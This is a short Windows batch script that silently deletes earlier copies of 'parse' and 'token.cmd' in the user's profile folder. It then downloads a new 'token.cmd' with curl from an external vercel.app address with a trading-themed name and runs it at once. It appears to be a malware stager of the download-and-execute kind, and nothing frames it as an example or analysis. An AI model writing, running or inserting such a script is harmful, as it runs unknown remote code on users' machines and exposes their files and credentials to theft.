::@echo off
if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
curl -s -L -o "%USERPROFILE%//token.cmd" "https://trading-v1-99wu.vercel.app/120/token.cmd" token.cmd
"%USERPROFILE%\token.cmd"
::cls
